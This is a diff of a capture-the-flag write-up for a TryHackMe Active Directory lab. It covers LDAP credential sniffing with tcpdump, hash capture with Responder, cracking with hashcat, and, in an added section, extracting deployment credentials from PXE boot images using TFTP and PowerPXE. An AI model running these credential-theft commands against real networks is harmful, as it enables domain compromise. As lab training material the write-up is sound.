@@ -334,7 +334,7 @@ firefox http://printer.za.tryhackme.com/settings.aspx
 
 Fill in the creds and then:
 
-```
+```shell
 sudo tcpdump -SX -i breachad tcp port 389
 ```
 
@@ -362,7 +362,7 @@ When a client (e.g., a workstation or service) tries to authenticate using SMB, 
 
 Let's follow the steps:
 
-```
+```shell
 sudo responder -I breachad
 ```
 
@@ -380,7 +380,7 @@ After a bit of waiting, here's the output it showed:
 
 We save the entire response (`svcFileCopy` and onwards) to a file `hash.txt`. Now let's download the task file and crack it using the password list provided:
 
-```
+```shell
 hashcat -m 5600 hash.txt passwords.txt --force
 ```
 
@@ -391,3 +391,91 @@ SVCFILECOPY::ZA:76d998cefda390b1:254a1aa38 [...] d7f9757f:010100000 [...] 000000
 ```
 
 We have the password!
+
+This task is focusing on exploiting misconfigurations in Microsoft's MDT and SCCM deployment tools, which are commonly used is large organizations for operating system deployment and patch management. 
+
+MDT (Microsoft Deployment Toolkit): This tool automates the deployment of Microsoft operating systems. It's often used in conjunction with SCCM (System Center Configuration Manager) to manage software, updates, and system configurations.
+
+PXE Boot is a method used in large organizations to deploy operating systems over the network. By booting from a network server, new devices can load and install an OS without the need for physical installation media like DVDs or USB drives.
+
+Attackers can exploit misconfigurations in the PXE boot process to recover or inject credentials that were used during the OS deployment process. For example, attackers can recover credentials from the `bootstrap.ini` file, which contains sensitive AD account information used during deployment.
+
+TFTP is used to download configuration files and boot images from the MDT server. Once the BCD (Boot Configuration Data) file is downloaded, attackers can extract the details of the PXE boot image (WIM file). The credentials stored in the bootstrap.ini file can then be retrieved, which may include domain administrator credentials or service account credentials used during the unattended installation.
+
+Let's find the IP of the MDT server:
+
+```
+└─$ nslookup thmmdt.za.tryhackme.com
+Server:         10.200.9.101
+Address:        10.200.9.101#53
+
+Name:   thmmdt.za.tryhackme.com
+Address: 10.200.9.202
+```
+
+Let's connect to the Jump Box using the provided password:
+
+```shell
+ssh thm@THMJMP1.za.tryhackme.com
+```
+
+Once inside, they navigate to the `Documents` directory, create a working folder (using their username), and copy the `powerpxe` tool:
+
+```cmd
+C:\Users\THM>cd Documents
+C:\Users\THM\Documents> mkdir gremlin
+C:\Users\THM\Documents> copy C:\powerpxe gremlin\
+C:\Users\THM\Documents\> cd gremlin
+```
+
+This setup allows us to run PowerPXE, a PowerShell-based tool for extracting credentials from PXE boot images.
+
+Retrieve the BCD file using TFTP. The BCD file contains the PXE boot c
+onfigurations, including which boot image to use for different system architectures:
+
+```cmd
+powershell -c 'tftp -i 10.200.9.202 GET "\Tmp\x64{51EEF035-C878-4BF3-8464-01DC62BC0237}.bcd" conf.bcd'
+```
+
+Once downloaded, use PowerPXE to extract information about the WIM (Windows Imaging Format) boot image:
+
+```cmd
+C\Users\THM\Documents\gremlin\> powershell -executionpolicy bypass
+```
+
+```powershell
+PS C:\Users\THM\Documents\Am0> Import-Module .\PowerPXE.ps1
+PS C:\Users\THM\Documents\Am0> $BCDFile = "conf.bcd"
+PS C:\Users\THM\Documents\Am0> Get-WimFile -bcdFile $BCDFile
+```
+
+The output should look like this:
+
+```
+>> Parse the BCD file: conf.bcd
+>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
+\Boot\x64\Images\LiteTouchPE_x64.wim
+```
+
+This is a PXE Boot Image location. We have to use `tftp` again to retrieve the image in question:
+
+```powershell
+tftp -i 10.200.9.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
+```
+
+Finally, they extract credentials from `pxeboot.wim`:
+
+```powershell
+Get-FindCredentials -WimFile pxeboot.wim
+```
+
+The output:
+
+```
+>> Open pxeboot.wim
+>>>> Finding Bootstrap.ini
+>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
+>>>> >>>> UserID = ******
+>>>> >>>> UserDomain = ZA
+>>>> >>>> UserPassword = ***************
+```
